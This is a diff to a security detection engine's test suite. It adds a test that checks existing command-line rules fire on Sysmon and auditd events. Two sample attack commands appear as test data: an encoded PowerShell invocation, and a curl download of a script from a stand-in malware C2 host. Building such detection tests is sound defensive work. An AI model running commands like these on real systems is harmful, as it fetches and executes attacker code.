@@ -221,6 +221,22 @@ def test_engine_fires_tripwire_fim_rules():
                 if "tripwire" in i}
 
 
+def test_existing_rules_fire_on_endpoint_telemetry():
+    """The new Sysmon / auditd parsers feed CommandLine into the fields existing
+    command-line rules already match — so endpoint telemetry lights them up."""
+    eng = DetectionEngine(load_rules(RULES_DIR))
+
+    def hits(**kw):
+        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}
+
+    assert "lo-powershell-encoded" in hits(          # Sysmon EID 1 process create
+        vendor="microsoft", product="sysmon", log_type="process-create",
+        action="process-create", message="powershell.exe -enc SQBFAFgA")
+    assert "lo-ingress-tool-transfer" in hits(       # Linux auditd EXECVE
+        vendor="linux", product="auditd", log_type="execve", action="process-create",
+        message="curl -O http://malware-c2.example.net/x.sh")
+
+
 def test_alert_from_match_builds_row():
     rule = next(r for r in load_rules(RULES_DIR) if r.id == "lo-win-failed-logon")
     evt = NormalizedEvent(event_time=None, vendor="microsoft", log_type="security",
